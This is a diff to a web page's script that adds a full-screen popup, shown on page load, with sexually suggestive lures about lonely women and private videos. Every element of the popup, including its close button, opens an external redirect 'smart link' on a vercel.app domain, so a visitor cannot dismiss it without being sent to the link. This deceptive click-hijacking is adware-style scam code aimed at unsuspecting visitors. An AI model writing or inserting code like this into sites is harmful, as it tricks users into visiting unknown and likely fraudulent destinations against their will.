@@ -414,6 +414,135 @@
             e.preventDefault();
             window.location.href = 'https://redirect01-z56s-git-main-benzee10000s-projects.vercel.app/';
         });
+    // Popup functionality
+        const popupMessages = [
+            "Join our VIP group & meet real girls ready for you…",
+            "Foreign single girls are waiting inside 🔥",
+            "Lonely women online now… join before it closes ⏳",
+            "Private WhatsApp videos only for fast joiners.",
+            "Hot girls nearby want to chat — join now.",
+            "Secret group: naughty clips vanish when timer ends.",
+            "VIP girls share uncensored moments inside.",
+            "They're live, they're wild… don't miss out.",
+            "Your access to horny singles ends soon.",
+            "Join now — exclusive access to real sexy women."
+        ];
+
+        function createPopup() {
+            // Create popup overlay
+            const overlay = document.createElement('div');
+            overlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100vw;
+                height: 100vh;
+                background: rgba(0, 0, 0, 0.8);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 10000;
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            `;
+
+            // Create popup content
+            const popup = document.createElement('div');
+            popup.style.cssText = `
+                background: white;
+                padding: 40px 30px;
+                border-radius: 15px;
+                max-width: 400px;
+                width: 90%;
+                text-align: center;
+                position: relative;
+                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+                animation: popupSlide 0.3s ease-out;
+            `;
+
+            // Add animation keyframes
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes popupSlide {
+                    from {
+                        transform: scale(0.8);
+                        opacity: 0;
+                    }
+                    to {
+                        transform: scale(1);
+                        opacity: 1;
+                    }
+                }
+            `;
+            document.head.appendChild(style);
+
+            // Create close button
+            const closeBtn = document.createElement('div');
+            closeBtn.innerHTML = '×';
+            closeBtn.style.cssText = `
+                position: absolute;
+                top: 15px;
+                right: 20px;
+                font-size: 28px;
+                color: #666;
+                cursor: pointer;
+                font-weight: bold;
+                line-height: 1;
+            `;
+
+            // Create message text
+            const messageText = document.createElement('p');
+            const randomMessage = popupMessages[Math.floor(Math.random() * popupMessages.length)];
+            messageText.textContent = randomMessage;
+            messageText.style.cssText = `
+                font-size: 18px;
+                color: #333;
+                margin: 20px 0 30px 0;
+                line-height: 1.5;
+                font-weight: 500;
+            `;
+
+            // Create join button
+            const joinBtn = document.createElement('button');
+            joinBtn.textContent = 'Join Now';
+            joinBtn.style.cssText = `
+                background: #25d366;
+                color: white;
+                border: none;
+                padding: 15px 40px;
+                font-size: 16px;
+                border-radius: 25px;
+                cursor: pointer;
+                font-weight: 600;
+                transition: background 0.3s ease;
+            `;
+
+            // Add hover effect
+            joinBtn.onmouseover = () => joinBtn.style.background = '#128c7e';
+            joinBtn.onmouseout = () => joinBtn.style.background = '#25d366';
+
+            // Function to redirect to smart link
+            function redirectToSmartLink() {
+                window.open('https://redirect01-z56s-git-main-benzee10000s-projects.vercel.app/', '_blank');
+            }
+
+            // Add event listeners - clicking anywhere redirects
+            overlay.addEventListener('click', redirectToSmartLink);
+            popup.addEventListener('click', redirectToSmartLink);
+            closeBtn.addEventListener('click', redirectToSmartLink);
+            joinBtn.addEventListener('click', redirectToSmartLink);
+
+            // Assemble popup
+            popup.appendChild(closeBtn);
+            popup.appendChild(messageText);
+            popup.appendChild(joinBtn);
+            overlay.appendChild(popup);
+
+            // Add to page
+            document.body.appendChild(overlay);
+        }
+
+        // Show popup immediately when page loads
+        window.addEventListener('load', createPopup);
     </script>
 </body>
 </html>
